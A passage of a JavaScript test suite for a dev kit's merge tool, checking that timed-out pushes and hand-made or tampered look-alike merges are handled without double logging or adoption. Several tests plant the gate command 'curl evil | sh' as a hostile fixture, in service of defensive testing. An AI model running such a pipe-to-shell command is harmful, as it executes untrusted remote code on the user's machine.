const MAYBE = /may have landed[^\n]*timed out before origin answered[^\n]*run merge [^\n]*again; it recognises the kit's own/;
// a merge on main with the kit's message and parents that the kit never recorded before a push (final-15 F1)
const NOT_RECORDED = (tip) => new RegExp(`main's tip ${tip.slice(0, 12)} has the kit's landing message and parents, but it isn't the landing merge the kit recorded for this head before its push: not the kit's own landing; nothing logged`);
const REC_NOT_RECORDED = (tip) => new RegExp(`home's main tip ${tip.slice(0, 12)} has the kit's records message and parents, but it isn't the records merge the kit recorded before its push: not the kit's own records merge; nothing logged`);
// what the kit writes before a landing push (run/landings/<repo>/<branch>@<head>.json), planted
// here to stand for a record the kit made of a merge it then refused to judge again
const plantLanding = (old, repoName, what, head, merge, onto) => write(path.join(old, 'docs/devteam/run/landings', encodeURIComponent(repoName), `${encodeURIComponent(what)}@${head}.json`), `${JSON.stringify([{ merge, onto, at: new Date().toISOString() }])}\n`);

test('A15 landing: forge git, a code push killed at the timeout that origin then takes: merge says it may have landed, and the rerun logs its act once, so the answer counts as landed (final-13 F1)', { timeout: 300000 }, () => {
  const T = setup('a15-pre-receive');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.equal(T.acts().length, before, 'no act yet');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    const added = T.acts().slice(before);
    assert.equal(added.length, 1, JSON.stringify(added));
    assert.equal(added[0].class, 'merge-chore');
    assert.equal(added[0].approved_by, q);
    assert.deepEqual(T.mainJobs(), { aa: check() });
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
    // a third run is a second run: nothing logged
    assert.match(T.merge('pre', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    assert.equal(T.acts().length, before + 1);
  } finally { T.done(); }
});

test('A15 landing: forge git, a merge on main that someone else made (another message, other parents, or the kit\'s very message and parents) is never taken as the kit\'s own landing (final-13 F1, final-15 F1)', () => {
  const T = setup('a15-hand-merge');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const tree = T.g(['rev-parse', `${sha}^{tree}`]);
    const before = T.acts().length;
    // merge's own message: the PR's title, its text (the whole run/pr file), and the head
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    const onOrigin = (c) => { T.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']); };
    // the same parents (main, then the head), another message
    onOrigin(T.g(['commit-tree', tree, '-p', main0, '-p', sha, '-m', 'a hand merge']));
    assert.match(T.merge('hand', ['--approved', q]).text, /chore-hand at [0-9a-f]{12} is already on main: nothing to merge, nothing logged/);
    // merge's own message, the parents swapped
    onOrigin(T.g(['commit-tree', tree, '-p', sha, '-p', main0, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    // merge's own message, the second parent a commit on top of the head, not the head
    const child = T.g(['commit-tree', tree, '-p', sha, '-m', 'on top of the head']);
    onOrigin(T.g(['commit-tree', tree, '-p', main0, '-p', child, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    // merge's own message and the head second, but the first already holds the head: not the merge that landed it
    onOrigin(T.g(['commit-tree', tree, '-p', child, '-p', sha, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    assert.equal(T.acts().length, before, 'nothing logged');
    // merge's own message onto main0, made by hand: the kit never recorded it, so it is refused (final-15 F1)
    const hand = T.g(['commit-tree', tree, '-p', main0, '-p', sha, '-m', KIT_MSG]);
    onOrigin(hand);
    const r = T.merge('hand', ['--approved', q]);
    refused(r, NOT_RECORDED(hand));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
  } finally { T.done(); }
});

test('A15 landing: forge git, a merge on main with the kit\'s parents and message but another tree (a gate, a file) is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
  const T = setup('a15-lookalike');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, wt);
    write(path.join(wt, 'src/evil.js'), 'evil\n');
    T.g(['add', '-A'], wt);
    const evil = T.g(['commit-tree', T.g(['write-tree'], wt), '-p', main0, '-p', sha, '-m', KIT_MSG]);
    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, NOT_RECORDED(evil));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
  } finally { T.done(); }
});

test('A15 landing: records in home, a merge on home\'s main with the kit\'s records parents and message but another tree is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
  const F = recordsHome('recur-rec-lookalike');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.mainNow();
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
    // a look-alike: the merge's tree and one file more outside the ticket's folder (one that adds a job is
    // refused before this, by the records checks: final-14 H14-4)
    const lookalike = (n, fn) => {
      const m = path.join(F.old, '.worktrees', `lookalike-${n}`);
      F.g(['worktree', 'add', '-q', '--detach', m, main0], F.old);
      F.g(['merge', '-q', '--no-ff', '--no-commit', head], m);
      fn(m);
      F.g(['add', '-A'], m);
      const c = F.g(['commit-tree', F.g(['write-tree'], m), '-p', main0, '-p', head, '-m', msg], m);
      F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], m);
      return c;
    };
    const c = lookalike('notes', (m) => write(path.join(m, `${PROJ}/notes-evil.md`), 'evil\n'));
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, REC_NOT_RECORDED(c));
    assert.doesNotMatch(r.text, /in the kit's own records merge/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
  } finally { F.done(); }
});

test('A15 landing: forge git, with commit.cleanup=strip in the repo\'s config, a code push killed at the timeout is still recognised as the kit\'s own landing on the rerun (final-14 F3)', { timeout: 300000 }, () => {
  const T = setup('a15-cleanup');
  try {
    T.g(['config', 'commit.cleanup', 'strip']);
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    assert.match(T.g(['log', '-1', '--format=%B', 'refs/heads/main'], T.org), /^# chore-pre: jobs$/m, 'the message is kept verbatim');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    assert.equal(T.acts().length, before + 1);
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

test('A15 landing: records in home, a records push killed at the timeout that home\'s origin then takes: merge says they may have landed, and the rerun logs their act once and lands the code (final-13 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-pre');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.g(['rev-parse', 'refs/heads/main'], F.org);
    const hook = slowPreReceive(F.org);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try {
      r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT }));
      assert.notEqual(refMoves(F.org, 'main', main0), main0, 'home\'s origin took the records push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, /the records of console-01-a may have landed in home \(the push to home's main timed out before origin answered/);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'no act yet');
    F.g(['merge-base', '--is-ancestor', head, F.mainNow()], F.old);
    const r2 = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r2.status, 0, r2.text);
    assert.match(r2.text, /in the kit's own records merge [0-9a-f]{12}, with no act logged/);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once');
    assert.equal(acts.filter((a) => a.class === 'merge-word' && a.refs?.includes(RID)).length, 1, 'the code\'s act, once');
  } finally { F.done(); }
});

test('A15 landing: records in home, a code push to the link killed at the timeout that its origin then takes: merge says it may have landed, and the rerun logs the merge act once (final-13 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-code-pre');
  try {
    recordsReady(F, RID);
    const trunk0 = F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin);
    const hook = slowPreReceive(F.consoleOrigin);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try {
      r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT }));
      assert.notEqual(refMoves(F.consoleOrigin, 'trunk', trunk0), trunk0, 'the link\'s origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, MAYBE);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    const r2 = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r2.status, 0, r2.text);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once (the first run)');
    assert.equal(acts.filter((a) => a.class === 'merge-word' && a.refs?.includes(RID)).length, 1, 'the code\'s act, once');
    assert.match(F.text(F.runIn(F.old, ['merge', RID], SUP)).text, /already on trunk: nothing to merge, nothing logged/);
  } finally { F.done(); }
});

// ---- the rerun adopts only a merge the kit recorded, and judges it onto the main it landed on (final-15 F1) ----

test('A15 landing: forge git, a hand-pushed real merge of a head changing the jobs and a gate is never adopted, and nothing is logged; recorded, it is judged onto the main it landed on and refused (final-15 F1, H15-4)', () => {
  const T = setup('a15-h15-4');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.choreBranch('hand', (w) => { putJobs(w, () => ({ aa: check() })); T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, w); });
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    // the control: merge's checks refuse it (one answer lands one change)
    refused(T.dry('hand', q), SPLIT('gates'));
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    // someone pushes the real git merge of main and that head, with the kit's message: the true merge tree
    const m = path.join(T.old, '.worktrees', 'h15-4');
    T.g(['worktree', 'add', '-q', '--detach', m, main0]);
    T.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', KIT_MSG, sha], m);
    const hand = T.g(['rev-parse', 'HEAD'], m);
    T.g(['push', '-q', '-f', 'origin', `${hand}:refs/heads/main`], m); T.g(['fetch', '-q', 'origin']);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, NOT_RECORDED(hand));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
    // were it recorded, its checks run onto main0, the main it landed on, and refuse it as the dry run did
    plantLanding(T.old, 'home', 'chore-hand', sha, hand, main0);
    const r2 = T.merge('hand', ['--approved', q]);
    refused(r2, SPLIT('gates'));
    assert.match(r2.text, new RegExp(`checking it onto ${main0.slice(0, 12)}, the main it landed on`));
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
  } finally { T.done(); }
});

test('A15 landing: records in home, a hand-pushed real records merge with a file outside its ticket folder is never adopted, and the code doesn\'t land; recorded, it is judged onto the main it landed on and refused (final-15 F1, H15-5)', () => {
  const F = recordsHome('recur-h15-5');
  try {
    const { rw } = recordsReady(F, RID);
    write(path.join(rw, `${PROJ}/notes-evil.md`), 'evil\n');
    F.g(['add', '-A'], rw); F.g(['commit', '-qm', 'notes'], rw); F.g(['push', '-q', '-f', 'origin', `ticket/${RID}`], rw);
    const head = F.g(['rev-parse', 'HEAD'], rw);
    // the control: merge's checks refuse it
    const d = F.text(F.runIn(F.old, ['merge', RID, '--dry-run'], SUP));
    assert.notEqual(d.status, 0, d.text);
    assert.match(d.text, /changes files outside its records folder/);
    const main0 = F.mainNow();
    const trunk0 = F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
    const m = path.join(F.old, '.worktrees', 'h15-5');
    F.g(['worktree', 'add', '-q', '--detach', m, main0], F.old);
    F.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', msg, head], m);
    const hand = F.g(['rev-parse', 'HEAD'], m);
    F.g(['push', '-q', '-f', 'origin', `${hand}:refs/heads/main`], m);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, REC_NOT_RECORDED(hand));
    assert.doesNotMatch(r.text, /in the kit's own records merge/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
    assert.equal(F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin), trunk0, 'the code did not land');
    // were it recorded, the records checks run onto main0, the main it landed on, and refuse it
    plantLanding(F.old, 'home', `records-${RID}`, head, hand, main0);
    const r2 = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r2.status, 0, r2.text);
    assert.match(r2.text, /changes files outside its records folder/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
    assert.equal(F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin), trunk0, 'the code did not land');
  } finally { F.done(); }
});

test('A15 landing: forge git, with merge.log=true in the repo\'s config, a code push killed at the timeout is still recognised as the kit\'s own landing on the rerun (final-15 F2, H15-3)', { timeout: 300000 }, () => {
  const T = setup('a15-mergelog');
  try {
    T.g(['config', 'merge.log', 'true']);
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    assert.doesNotMatch(T.g(['log', '-1', '--format=%B', 'refs/heads/main'], T.org), /^\* /m, 'no shortlog in the message');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    assert.equal(T.acts().length, before + 1);
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

// ---- a recorded merge is adopted whatever its message, and only with the tree merge builds (final-16 F1, F2) ----
const RECORDED_TREE = (tip) => new RegExp(`main's tip ${tip.slice(0, 12)} is a landing merge recorded for this head, but not the tree the kit's merge of its parents builds: not the kit's own landing; nothing logged`);
const REC_RECORDED_TREE = (tip) => new RegExp(`home's main tip ${tip.slice(0, 12)} is a records merge recorded for them, but not the tree the kit's merge of its parents builds: not the kit's own records merge; nothing logged`);

test('A15 landing: forge git, a code push killed at the timeout that origin then takes, and the PR text edited before the rerun: the recorded merge is adopted whatever its message, and its act logged once (final-16 F1, H16-1)', { timeout: 300000 }, () => {
  const T = setup('a15-h16-1');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    // the supervisor adds a Known limits line to the PR text before the rerun: the message no longer matches
    write(path.join(T.old, 'docs/devteam/run/pr/chore-pre.md'), '# chore-pre: jobs\n\n## One-way doors\n\nNone.\n\n## Known limits\n\nnone\n');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, new RegExp(`in the kit's own landing merge [0-9a-f]{12}, with no act logged[^\\n]*checking it onto ${main0.slice(0, 12)}`));
    const added = T.acts().slice(before);
    assert.equal(added.length, 1, JSON.stringify(added));
    assert.equal(added[0].approved_by, q);
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

test('A15 landing: forge git, a planted record of a hand-made merge whose tree adds a gate beside the judged head is never adopted, and nothing is logged (final-16 F2, H16-2)', () => {
  const T = setup('a15-h16-2');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    const m = path.join(T.old, '.worktrees', 'h16-2');
    T.g(['worktree', 'add', '-q', '--detach', m, main0]);
    T.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', KIT_MSG, sha], m);
    T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, m);
    T.g(['add', '-A'], m); T.g(['commit', '-q', '--amend', '--no-edit', '--cleanup=verbatim'], m);
    const evil = T.g(['rev-parse', 'HEAD'], m);
    assert.equal(T.g(['rev-list', '--parents', '-n', '1', evil]), `${evil} ${main0} ${sha}`, 'the head\'s own parents');
    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`], m); T.g(['fetch', '-q', 'origin']);
    plantLanding(T.old, 'home', 'chore-hand', sha, evil, main0);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, RECORDED_TREE(evil));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
  } finally { T.done(); }
});

test('A15 landing: forge git, a planted record of a merge whose parents conflict is never adopted: merge-tree fails, and nothing is logged (final-16 F2, H15-1)', () => {
  const T = setup('a15-h15-1');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    // E: main0 with a jobs file of its own (an add/add conflict with the head's)
    const e = path.join(T.old, '.worktrees', 'h15e');
    T.g(['worktree', 'add', '-q', '--detach', e, main0]);
    write(path.join(e, JOBS), jobsText({ bb: check() }));
    T.g(['add', '-A'], e); T.g(['commit', '-qm', 'E'], e);
    const E = T.g(['rev-parse', 'HEAD'], e);
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    const evil = T.g(['commit-tree', `${sha}^{tree}`, '-p', E, '-p', sha, '-m', KIT_MSG]);
    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']);
    plantLanding(T.old, 'home', 'chore-hand', sha, evil, E);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, RECORDED_TREE(evil));
    assert.match(r.text, /git merge-tree of its parents failed or conflicts/);
    assert.equal(T.acts().length, before, 'nothing logged');
  } finally { T.done(); }
});

test('A15 landing: records in home, a planted record of a records merge whose parents conflict is never adopted: merge-tree fails, and nothing is logged (final-16 F2, H15-2)', () => {
  const F = recordsHome('recur-h15-2');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.mainNow();
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
    const e = path.join(F.old, '.worktrees', 'h15e');
    F.g(['worktree', 'add', '-q', '--detach', e, main0], F.old);
    write(path.join(e, `${PROJ}/tickets/${RID}/spec.md`), '# another spec\n');
    F.g(['add', '-A'], e); F.g(['commit', '-qm', 'E'], e);
    const E = F.g(['rev-parse', 'HEAD'], e);
    const c = F.g(['commit-tree', `${head}^{tree}`, '-p', E, '-p', head, '-m', msg], e);
    F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], e);
    plantLanding(F.old, 'home', `records-${RID}`, head, c, E);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, REC_RECORDED_TREE(c));
    assert.match(r.text, /git merge-tree of its parents failed or conflicts/);
    assert.doesNotMatch(r.text, /in the kit's own records merge/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
  } finally { F.done(); }
});

const ONTO_UNSEEN = (tip, onto) => new RegExp(`main's tip ${tip.slice(0, 12)} is a landing merge recorded for this head onto ${onto.slice(0, 12)}, which this clone never saw as origin's main: not the kit's own landing; nothing logged`);
const REC_ONTO_UNSEEN = (tip, onto) => new RegExp(`home's main tip ${tip.slice(0, 12)} is a records merge recorded for them onto ${onto.slice(0, 12)}, which this clone never saw as origin's main: not the kit's own records merge; nothing logged`);

test('A15 landing: forge git, a planted record of the real merge of the head onto a first parent that was never main (it carries an unanswered job) is never adopted, and nothing is logged (final-17 F1, H17-1)', () => {
  const T = setup('a15-h17-1');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    // O': main0 and an unanswered job bb, never pushed to main; the chore head on it adds aa
    const o = path.join(T.old, '.worktrees', 'h17o');
    T.g(['worktree', 'add', '-q', '--detach', o, main0]);
    putJobs(o, () => ({ bb: check({ title: 'B', run: 'echo bb' }) }));
    T.g(['add', '-A'], o); T.g(['commit', '-qm', 'O prime'], o);
    const Op = T.g(['rev-parse', 'HEAD'], o);
    T.g(['checkout', '-q', '-b', 'chore-hand'], o);
    putJobs(o, (j) => ({ ...j, aa: check() }));
    T.g(['add', '-A'], o); T.g(['commit', '-qm', 'chore-hand: jobs'], o);
    const sha = T.g(['rev-parse', 'HEAD'], o);
    T.g(['push', '-q', '-f', 'origin', 'chore-hand'], o);
    write(path.join(T.old, 'docs/devteam/run/pr/chore-hand.md'), '# chore-hand: jobs\n\n## One-way doors\n\nNone.\n');
    // the control: an honest merge refuses it, since bb is a change too
    refused(T.dry('hand', q), /recurring\.bb is added here/);
    // the real merge of O' and the head (its tree is merge's own), pushed to main, and a record onto O'
    const m = path.join(T.old, '.worktrees', 'h17m');
    T.g(['worktree', 'add', '-q', '--detach', m, Op]);
    T.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', 'a hand merge', sha], m);
    const hand = T.g(['rev-parse', 'HEAD'], m);
    T.g(['push', '-q', '-f', 'origin', `${hand}:refs/heads/main`], m); T.g(['fetch', '-q', 'origin']);
    plantLanding(T.old, 'home', 'chore-hand', sha, hand, Op);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, ONTO_UNSEEN(hand, Op));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
  } finally { T.done(); }
});

test('A15 landing: records in home, a planted record of the real records merge onto a first parent that was never home\'s main is never adopted, and nothing is logged (final-17 F1, H17-1)', () => {
  const F = recordsHome('recur-h17-1r');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.mainNow();
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    const trunk0 = F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin);
    // E: main0 and a file outside the records folder, never pushed to main; the real merge of E and
    // the records, pushed to home's main, and a record onto E
    const e = path.join(F.old, '.worktrees', 'h17e');
    F.g(['worktree', 'add', '-q', '--detach', e, main0], F.old);
    write(path.join(e, `${PROJ}/notes-evil.md`), 'evil\n');
    F.g(['add', '-A'], e); F.g(['commit', '-qm', 'E'], e);
    const E = F.g(['rev-parse', 'HEAD'], e);
    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
    F.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', msg, head], e);
    const c = F.g(['rev-parse', 'HEAD'], e);
    F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], e);
    plantLanding(F.old, 'home', `records-${RID}`, head, c, E);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, REC_ONTO_UNSEEN(c, E));
    assert.doesNotMatch(r.text, /in the kit's own records merge/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
    assert.equal(F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin), trunk0, 'the code did not land');
  } finally { F.done(); }
});

test('A15 landing: forge git, with merge.directoryRenames=true in the repo\'s config, a planted record of a hand merge that moved the head\'s file into a renamed directory is never adopted: the kit\'s merge-tree takes a directory rename as a conflict (final-17 F2)', () => {
  const T = setup('a15-dirren');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.onMainFile('old/a.txt', 'a\n', 'main: old/');
    // the head adds aa and a file in old/; then main renames old/ to new/
    const wt = T.choreBranch('hand', (w) => { putJobs(w, () => ({ aa: check() })); write(path.join(w, 'old/b.txt'), 'b\n'); });
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.onMainDo((cwd) => T.g(['mv', 'old', 'new'], cwd), 'main: old/ is new/');
    const main1 = T.g(['rev-parse', 'origin/main']);
    // the repo's config applies directory renames: a hand merge moves old/b.txt to new/b.txt
    T.g(['config', 'merge.directoryRenames', 'true']);
    const m = path.join(T.old, '.worktrees', 'dirren');
    T.g(['worktree', 'add', '-q', '--detach', m, main1]);
    T.g(['merge', '-q', '--no-ff', '-m', 'a hand merge', sha], m);
